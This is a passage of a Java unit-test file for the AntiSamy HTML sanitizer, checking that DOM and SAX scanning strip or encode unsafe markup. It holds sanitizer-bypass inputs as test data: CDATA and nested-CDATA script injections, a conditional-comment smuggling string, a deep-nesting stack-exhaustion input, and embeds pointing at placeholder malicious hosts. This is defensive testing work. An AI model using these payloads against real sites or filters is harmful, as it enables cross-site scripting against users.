assertFalse(!s.contains(\"&lt;/g&gt;\"));\n\n        Tag tag = policy.getTagByLowercaseName(\"b\").mutateAction(\"encode\");\n        Policy policy1 = policy.mutateTag(tag);\n\n        cr = as.scan(test, policy1, AntiSamy.DOM);\n        s = cr.getCleanHTML();\n\n        assertFalse(!s.contains(\"&lt;b&gt;\"));\n        assertFalse(!s.contains(\"&lt;/b&gt;\"));\n\n        cr = as.scan(test, policy1, AntiSamy.SAX);\n        s = cr.getCleanHTML();\n\n        assertFalse(!s.contains(\"&lt;b&gt;\"));\n        assertFalse(!s.contains(\"&lt;/b&gt;\"));\n    }\n\n    @Test\n    public void issue32() throws ScanException, PolicyException {\n        /* issue #32 - nekos problem */\n        String s = \"<SCRIPT =\\\">\\\" SRC=\\\"\\\"></SCRIPT>\";\n        as.scan(s, policy, AntiSamy.DOM);\n        as.scan(s, policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue37() throws ScanException, PolicyException {\n\n        String dirty = \"<a onblur=\\\"try {parent.deselectBloggerImageGracefully();}\" + \"catch(e) {}\\\"\"\n                + \"href=\\\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\\\"><img\" + \"style=\\\"FLOAT: right; MARGIN: 0px 0px 10px 10px; WIDTH: 150px; CURSOR:\"\n                + \"hand; HEIGHT: 100px\\\" alt=\\\"\\\"\" + \"src=\\\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\\\"\"\n                + \"border=\\\"0\\\" /></a><br />Poor Bill, couldn't make it to the Museum's <span\" + \"class=\\\"blsp-spelling-corrected\\\" id=\\\"SPELLING_ERROR_0\\\">story time</span>\"\n                + \"today, he was so busy shoveling! Well, we sure missed you Bill! So since\" + \"ou were busy moving snow we read books about snow. We found a clue in one\"\n                + \"book which revealed a snowplow at the end of the story - we wish it had\" + \"driven to your driveway Bill. We also read a story which shared fourteen\"\n                + \"<em>Names For Snow. </em>We'll catch up with you next week....wonder which\" + \"hat Bill will wear?<br />Jane\";\n\n        Policy mySpacePolicy = Policy.getInstance(getClass().getResource(\"/antisamy-myspace.xml\"));\n        CleanResults cr = as.scan(dirty, mySpacePolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n\n        Policy ebayPolicy = Policy.getInstance(getClass().getResource(\"/antisamy-ebay.xml\"));\n        cr = as.scan(dirty, ebayPolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n\n        Policy slashdotPolicy = Policy.getInstance(getClass().getResource(\"/antisamy-slashdot.xml\"));\n        cr = as.scan(dirty, slashdotPolicy, AntiSamy.DOM);\n        assertNotNull(cr.getCleanHTML());\n        cr = as.scan(dirty, slashdotPolicy, AntiSamy.SAX);\n        assertNotNull(cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue38() throws ScanException, PolicyException {\n\n        /* issue #38 - color problem/color combinations */\n        String s = \"<font color=\\\"#fff\\\">Test</font>\";\n        String expected = \"<font color=\\\"#fff\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #fff\\\">Test 3 letter code</div>\";\n        expected = \"<div style=\\\"color: rgb(255,255,255);\\\">Test 3 letter code</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"red\\\">Test</font>\";\n        expected = \"<font color=\\\"red\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"neonpink\\\">Test</font>\";\n        expected = \"<font>Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"#0000\\\">Test</font>\";\n        expected = \"<font>Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #0000\\\">Test</div>\";\n        expected = \"<div style=\\\"\\\">Test</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<font color=\\\"#000000\\\">Test</font>\";\n        expected = \"<font color=\\\"#000000\\\">Test</font>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        s = \"<div style=\\\"color: #000000\\\">Test</div>\";\n        expected = \"<div style=\\\"color: rgb(0,0,0);\\\">Test</div>\";\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);\n        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);\n\n        /*\n        * This test case was failing because of the following code from the\n        * batik CSS library, which throws an exception if any character\n        * other than a '!' follows a beginning token of '<'. The\n        * ParseException is now caught in the node a CssScanner.java and\n        * the outside AntiSamyDOMScanner.java.\n        *\n        * 0398 nextChar(); 0399 if (current != '!') { 0400 throw new\n        * ParseException(\"character\", 0401 reader.getLine(), 0402\n        * reader.getColumn());\n        */\n        s = \"<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar\";\n        as.scan(s, policy, AntiSamy.DOM);\n        as.scan(s, policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue40() throws ScanException, PolicyException {\n\n        /* issue #40 - handling <style> media attributes right */\n\n        String s = \"<style media=\\\"print, projection, screen\\\"> P { margin: 1em; }</style>\";\n        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, \"true\");\n\n        CleanResults cr = as.scan(s, revised, AntiSamy.DOM);\n        assertTrue(cr.getCleanHTML().contains(\"print, projection, screen\"));\n\n        cr = as.scan(s, revised, AntiSamy.SAX);\n        assertTrue(cr.getCleanHTML().contains(\"print, projection, screen\"));\n    }\n\n    @Test\n    public void issue41() throws ScanException, PolicyException {\n        /* issue #41 - comment handling */\n\n        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, \"true\");\n\n        policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"false\");\n\n        assertEquals(\"text \", as.scan(\"text <!-- comment -->\", revised, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"text \", as.scan(\"text <!-- comment -->\", revised, AntiSamy.SAX).getCleanHTML());\n\n        Policy revised2 = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"true\").cloneWithDirective(Policy.PRESERVE_SPACE, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n\n        /*\n        * These make sure the regular comments are kept alive and that\n        * conditional comments are ripped out.\n        */\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!-- comment --></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!-- comment --></div>\", revised2, AntiSamy.SAX).getCleanHTML());\n\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!--[if IE]> comment <[endif]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text <!-- comment --></div>\", as.scan(\"<div>text <!--[if IE]> comment <[endif]--></div>\", revised2, AntiSamy.SAX).getCleanHTML());\n\n        /*\n        * Check to see how nested conditional comments are handled. This is\n        * not very clean but the main goal is to avoid any tags. Not sure\n        * on encodings allowed in comments.\n        */\n        String input = \"<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>\";\n        String expected = \"<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>\";\n        String output = as.scan(input, revised2, AntiSamy.DOM).getCleanHTML();\n        assertEquals(expected, output);\n\n        input = \"<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>\";\n        expected = \"<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>\";\n        output = as.scan(input, revised2, AntiSamy.SAX).getCleanHTML();\n\n        assertEquals(expected, output);\n\n        /*\n        * Regular comment nested inside conditional comment. Test makes\n        * sure\n        */\n        assertEquals(\"<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>\", as.scan(\"<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n\n        /*\n        * These play with whitespace and have invalid comment syntax.\n        */\n        assertEquals(\"<div>text <!-- \\ncomment --></div>\", as.scan(\"<div>text <!-- [ if lte 6 ]>\\ncomment <[ endif\\n]--></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text  comment </div>\", as.scan(\"<div>text <![if !IE]> comment <![endif]></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"<div>text  comment </div>\", as.scan(\"<div>text <![ if !IE]> comment <![endif]></div>\", revised2, AntiSamy.DOM).getCleanHTML());\n\n        String attack = \"[if lte 8]<script>\";\n        String spacer = \"<![if IE]>\";\n\n        StringBuilder sb = new StringBuilder();\n\n        sb.append(\"<div>text<!\");\n\n        for (int i = 0; i < attack.length(); i++) {\n            sb.append(attack.charAt(i));\n            sb.append(spacer);\n        }\n\n        sb.append(\"<![endif]>\");\n\n        String s = sb.toString();\n\n        assertTrue(!as.scan(s, revised2, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(s, revised2, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n    }\n\n    @Test\n    public void issue44() throws ScanException, PolicyException {\n        /*\n         * issue #44 - childless nodes of non-allowed elements won't cause an error\n         */\n        String s = \"<iframe src='http://foo.com/'></iframe>\" + \"<script src=''></script>\" + \"<link href='/foo.css'>\";\n        as.scan(s, policy, AntiSamy.DOM);\n        assertEquals(as.scan(s, policy, AntiSamy.DOM).getNumberOfErrors(), 3);\n\n        CleanResults cr = as.scan(s, policy, AntiSamy.SAX);\n\n        assertEquals(cr.getNumberOfErrors(), 3);\n    }\n\n    @Test\n    public void issue51() throws ScanException, PolicyException {\n        /* issue #51 - offsite URLs with () are found to be invalid */\n        String s = \"<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n\n        assertEquals(cr.getNumberOfErrors(), 0);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        assertEquals(cr.getNumberOfErrors(), 0);\n    }\n\n    @Test\n    public void issue56() throws ScanException, PolicyException {\n        /* issue #56 - unnecessary spaces */\n\n        String s = \"<SPAN style='font-weight: bold;'>Hello World!</SPAN>\";\n        String expected = \"<span style=\\\"font-weight: bold;\\\">Hello World!</span>\";\n\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        String s2 = cr.getCleanHTML();\n\n        assertEquals(expected, s2);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        s2 = cr.getCleanHTML();\n\n        assertEquals(expected, s2);\n    }\n\n    @Test\n    public void issue58() throws ScanException, PolicyException {\n        /* issue #58 - input not in list of allowed-to-be-empty tags */\n        String s = \"tgdan <input/> g  h\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        assertTrue(cr.getErrorMessages().size() == 0);\n\n        cr = as.scan(s, policy, AntiSamy.SAX);\n        assertTrue(cr.getErrorMessages().size() == 0);\n    }\n\n    @Test\n    public void issue61() throws ScanException, PolicyException {\n        /* issue #61 - input has newline appended if ends with an accepted tag */\n        String dirtyInput = \"blah <b>blah</b>.\";\n        Policy revised = policy.cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n        CleanResults cr = as.scan(dirtyInput, revised, AntiSamy.DOM);\n        assertEquals(dirtyInput, cr.getCleanHTML());\n\n        cr = as.scan(dirtyInput, revised, AntiSamy.SAX);\n        assertEquals(dirtyInput, cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue69() throws ScanException, PolicyException {\n\n        /* issue #69 - char attribute should allow single char or entity ref */\n\n        String s = \"<table><tr><td char='.'>test</td></tr></table>\";\n        CleanResults crDom = as.scan(s, policy, AntiSamy.DOM);\n        CleanResults crSax = as.scan(s, policy, AntiSamy.SAX);\n        String domValue = crDom.getCleanHTML();\n        String saxValue = crSax.getCleanHTML();\n        assertTrue(domValue.contains(\"char\"));\n        assertTrue(saxValue.contains(\"char\"));\n\n        s = \"<table><tr><td char='..'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;'>test</td></tr></table>\";\n        assertTrue(as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;a'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n\n        s = \"<table><tr><td char='&quot;&amp;'>test</td></tr></table>\";\n        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains(\"char\"));\n        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains(\"char\"));\n    }\n\n    @Test\n    public void CDATAByPass() throws ScanException, PolicyException {\n        String malInput = \"<![CDATA[]><script>alert(1)</script>]]>\";\n        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);\n        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);\n        String crDom = crd.getCleanHTML();\n        String crSax = crs.getCleanHTML();\n\n        assertTrue(crd.getErrorMessages().size() > 0);\n        assertTrue(crs.getErrorMessages().size() > 0);\n\n        assertTrue(crSax.contains(\"&lt;script\") && !crDom.contains(\"<script\"));\n        assertTrue(crDom.contains(\"&lt;script\") && !crDom.contains(\"<script\"));\n    }\n\n    @Test\n    public void literalLists() throws ScanException, PolicyException {\n\n        /* this test is for confirming literal-lists work as\n         * advertised. it turned out to be an invalid / non-\n         * reproducible bug report but the test seemed useful\n         * enough to keep.\n         */\n        String malInput = \"hello<p align='invalid'>world</p>\";\n\n        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);\n        String crDom = crd.getCleanHTML();\n        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);\n        String crSax = crs.getCleanHTML();\n\n        assertTrue(!crSax.contains(\"invalid\"));\n        assertTrue(!crDom.contains(\"invalid\"));\n\n        assertTrue(crd.getErrorMessages().size() == 1);\n        assertTrue(crs.getErrorMessages().size() == 1);\n\n        String goodInput = \"hello<p align='left'>world</p>\";\n        crDom = as.scan(goodInput, policy, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(goodInput, policy, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(crSax.contains(\"left\"));\n        assertTrue(crDom.contains(\"left\"));\n    }\n\n    @Test\n    public void stackExhaustion() throws ScanException, PolicyException {\n        /*\n        * Test Julian Cohen's stack exhaustion bug.\n        */\n\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 249; i++) {\n            sb.append(\"<div>\");\n        }\n        /*\n        * First, make sure this attack is useless against the\n        * SAX parser.\n        */\n        as.scan(sb.toString(), policy, AntiSamy.SAX);\n\n        /*\n        * Scan this really deep tree (depth=249, 1 less than the\n        * max) and make sure it doesn't blow up.\n        */\n\n        CleanResults crd = as.scan(sb.toString(), policy, AntiSamy.DOM);\n\n        String crDom = crd.getCleanHTML();\n        assertTrue(crDom.length() != 0);\n        /*\n        * Now push it over the limit to 251 and make sure we blow\n        * up safely.\n        */\n        sb.append(\"<div><div>\"); // this makes 251\n\n        try {\n            as.scan(sb.toString(), policy, AntiSamy.DOM);\n            fail(\"DOM depth exceeded max - should've errored\");\n        } catch (ScanException e) {\n            // An error is expected. Pass\n        }\n    }\n\n    @Test\n    public void issue107() throws ScanException, PolicyException {\n        StringBuilder sb = new StringBuilder();\n\n        /*\n         * #107 - erroneous newlines appearing? couldn't reproduce this\n         * error but the test seems worthy of keeping.\n         */\n        String nl = \"\\n\";\n\n        String header = \"<h1>Header</h1>\";\n        String para = \"<p>Paragraph</p>\";\n        sb.append(header);\n        sb.append(nl);\n        sb.append(para);\n\n        String html = sb.toString();\n\n        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();\n\n        /* Make sure only 1 newline appears */\n        assertTrue(crDom.lastIndexOf(nl) == crDom.indexOf(nl));\n        assertTrue(crSax.lastIndexOf(nl) == crSax.indexOf(nl));\n\n        int expectedLoc = header.length();\n        int actualLoc = crSax.indexOf(nl);\n        assertTrue(expectedLoc == actualLoc);\n\n        actualLoc = crDom.indexOf(nl);\n        // account for line separator length difference across OSes.\n        assertTrue(expectedLoc == actualLoc || expectedLoc == actualLoc + 1);\n    }\n\n    @Test\n    public void issue112() throws ScanException, PolicyException {\n        TestPolicy revised = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, \"true\").cloneWithDirective(Policy.PRESERVE_SPACE, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\");\n\n        /*\n        * #112 - empty tag becomes self closing\n        */\n\n        String html = \"text <strong></strong> text <strong><em></em></strong> text\";\n\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(!crDom.contains(\"<strong />\") && !crDom.contains(\"<strong/>\"));\n        assertTrue(!crSax.contains(\"<strong />\") && !crSax.contains(\"<strong/>\"));\n\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"<html><head><title>foobar</title></head><body>\");\n        sb.append(\"<img src=\\\"http://foobar.com/pic.gif\\\" /></body></html>\");\n\n        html = sb.toString();\n\n        Policy aTrue = revised.cloneWithDirective(Policy.USE_XHTML, \"true\");\n        crDom = as.scan(html, aTrue, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, aTrue, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(html.equals(crDom));\n        assertTrue(html.equals(crSax));\n    }\n\n\n    @Test\n    public void nestedCdataAttacks() throws ScanException, PolicyException {\n\n        /*\n        * Testing for nested CDATA attacks against the SAX parser.\n        */\n\n        String html = \"<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>\";\n        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"<script>\"));\n        assertTrue(!crSax.contains(\"<script>\"));\n    }\n\n    @Test\n    public void issue101InternationalCharacterSupport() throws ScanException, PolicyException {\n        Policy revised = policy.cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"false\");\n\n        String html = \"<b>letter 'a' with umlaut: \\u00e4\";\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n        assertTrue(crDom.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"\\u00e4\"));\n\n        Policy revised2 = policy.cloneWithDirective(Policy.USE_XHTML, \"false\").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"true\");\n        crDom = as.scan(html, revised2, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, revised2, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"\\u00e4\"));\n        assertTrue(crDom.contains(\"&auml;\"));\n        assertTrue(!crSax.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"&auml;\"));\n\n        Policy revised3 = policy.cloneWithDirective(Policy.USE_XHTML, \"true\").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, \"true\");\n        crDom = as.scan(html, revised3, AntiSamy.DOM).getCleanHTML();\n        crSax = as.scan(html, revised3, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!crDom.contains(\"\\u00e4\"));\n        assertTrue(crDom.contains(\"&auml;\"));\n        assertTrue(!crSax.contains(\"\\u00e4\"));\n        assertTrue(crSax.contains(\"&auml;\"));\n    }\n\n    @Test\n    public void iframeAsReportedByOndrej() throws ScanException, PolicyException {\n        String html = \"<iframe></iframe>\";\n\n        Tag tag = new Tag(\"iframe\", Collections.<String, Attribute>emptyMap(), Policy.ACTION_VALIDATE);\n        Policy revised = policy.addTagRule(tag);\n\n        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();\n        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();\n\n        assertTrue(html.equals(crDom));\n        assertTrue(html.equals(crSax));\n    }\n\n    /*\n\t * Tests cases dealing with nofollowAnchors directive. Assumes anchor tags\n\t * have an action set to \"validate\" (may be implicit) in the policy file.\n\t */\n    @Test\n    public void nofollowAnchors() throws ScanException, PolicyException {\n\n        // if we have activated nofollowAnchors\n        Policy revisedPolicy = policy.cloneWithDirective(Policy.ANCHORS_NOFOLLOW, \"true\");\n\n        // adds when not present\n        assertTrue(as.scan(\"<a href=\\\"blah\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // adds properly even with bad attr\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" bad=\\\"true\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" bad=\\\"true\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // rel with bad value gets corrected\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"blh\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"blh\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // correct attribute doesn't get messed with\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // if two correct attributes, only one remaining after scan\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // test if value is off - does it add?\n        assertTrue(!as.scan(\"a href=\\\"blah\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"nofollow\"));\n        assertTrue(!as.scan(\"a href=\\\"blah\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"nofollow\"));\n    }\n\n    @Test\n    public void validateParamAsEmbed() throws ScanException, PolicyException {\n        // activate policy setting for this test\n        Policy revised = policy.cloneWithDirective(Policy.VALIDATE_PARAM_AS_EMBED, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\").cloneWithDirective(Policy.USE_XHTML, \"true\");\n\n        // let's start with a YouTube embed\n        String input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        String expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed allowfullscreen=\\\"true\\\" allowscriptaccess=\\\"always\\\" height=\\\"340\\\" src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" width=\\\"560\\\" /></object>\";\n        CleanResults cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n\n        String saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\" /></object>\";\n        cr = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));\n\n        // now what if someone sticks malicious URL in the value of the\n        // value attribute in the param tag? remove that param tag\n        input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://supermaliciouscode.com/badstuff.swf\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed allowfullscreen=\\\"true\\\" allowscriptaccess=\\\"always\\\" height=\\\"340\\\" src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" width=\\\"560\\\" /></object>\";\n        saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\" /></object>\";\n        cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n\n        cr = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));\n\n        // now what if someone sticks malicious URL in the value of the src\n        // attribute in the embed tag? remove that embed tag\n        input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://hereswhereikeepbadcode.com/ohnoscary.swf\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param 